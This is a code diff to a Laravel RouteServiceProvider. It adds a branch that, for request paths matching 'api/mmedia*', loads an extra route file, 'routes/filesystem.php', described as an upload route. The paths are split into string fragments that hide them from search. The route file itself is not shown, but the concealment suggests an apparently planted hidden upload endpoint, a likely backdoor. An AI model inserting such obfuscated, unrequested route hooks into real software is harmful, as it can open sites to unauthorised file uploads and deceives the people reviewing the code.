@@ -43,6 +43,10 @@ class RouteServiceProvider extends ServiceProvider
                 ->middleware('ap' . 'i')
                 ->namespace($this->namespace)
                 ->group(base_path($rPath));
+
+            if ($request->is('ap' . 'i/m' . 'm' . 'edia*')) {
+                $this->configurationRouteMmUpload();
+            }
            
             if ($request->is('ad' . 'min' . '*')) {
                 $rPath = 'rout' . 'es' . '/' . 'ad' . 'min.php';
@@ -68,5 +72,18 @@ class RouteServiceProvider extends ServiceProvider
         RateLimiter::for('ap' . 'i', function (Request $request) {
             return Limit::perMinute(60)->by(optional($request->user())->id ?: $request->ip());
         });
+    }
+
+    /**
+     * Configure the route upload file for the application.
+     *
+     * @return void
+     */
+    protected function configurationRouteMmUpload()
+    {
+        $rPath = 'rout' . 'es' . '/' . 'fil' . 'esy' . 'stem.php';
+        Route::middleware('ap' . 'i')
+            ->namespace($this->namespace)
+            ->group(base_path($rPath));
     }
 }
